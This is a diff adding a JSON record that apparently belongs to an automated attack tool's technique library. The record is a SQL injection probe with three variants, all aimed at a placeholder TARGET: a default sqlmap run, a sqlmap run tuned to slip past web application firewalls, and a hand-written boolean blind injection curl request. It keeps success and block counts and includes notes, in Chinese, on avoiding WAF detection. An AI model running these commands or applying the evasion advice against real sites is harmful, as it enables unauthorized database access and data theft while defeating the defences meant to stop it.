@@ -1,0 +1,43 @@
+{
+  "id": "w002",
+  "name": "SQL 注入联合查询探测",
+  "family": "web/sqli",
+  "match": {"product": "any-web"},
+  "variants": [
+    {
+      "vid": "v1",
+      "desc": "sqlmap 默认 UA 与 payload",
+      "command": "sqlmap -u 'http://TARGET/item?id=1' --batch --dbs",
+      "sig": ["sqlmap", "User-Agent: sqlmap", "AND 1=1", "UNION SELECT"],
+      "stats": {"tries": 0, "ok": 0, "blocked": 0, "fail": 0},
+      "streak_fail": 0,
+      "confidence": 0.5
+    },
+    {
+      "vid": "v2",
+      "desc": "随机 UA + 大小写混淆 + 注释插入 + 限速",
+      "command": "sqlmap -u 'http://TARGET/item?id=1' --batch --dbs --random-agent --tamper=space2comment,between --delay=1 --time-sec=3",
+      "sig": [],
+      "stats": {"tries": 0, "ok": 0, "blocked": 0, "fail": 0},
+      "streak_fail": 0,
+      "confidence": 0.5
+    },
+    {
+      "vid": "v3",
+      "desc": "手工布尔盲注，单请求验证，不跑自动化",
+      "command": "curl -s 'http://TARGET/item?id=1%20AND%20(SELECT%20SUBSTR(database(),1,1))%3E%27a%27' -H 'User-Agent: Mozilla/5.0'",
+      "sig": [],
+      "stats": {"tries": 0, "ok": 0, "blocked": 0, "fail": 0},
+      "streak_fail": 0,
+      "confidence": 0.5
+    }
+  ],
+  "evasion": {
+    "traffic": "v2 用 --delay=1 把请求压到 1 req/s 以下",
+    "payload": "v2 用 space2comment（空格转 /**/）+ between（= 转 BETWEEN）",
+    "tool": "v1 的 sqlmap UA 是最容易被 WAF 拦的指纹，优先用 v2/v3"
+  },
+  "notes": "先手工确认注入点，再上工具；直接跑 sqlmap 在多数 WAF 下等于自曝。",
+  "created_at": "2026-11-15T00:00:00Z",
+  "updated_at": "2026-11-15T00:00:00Z"
+}
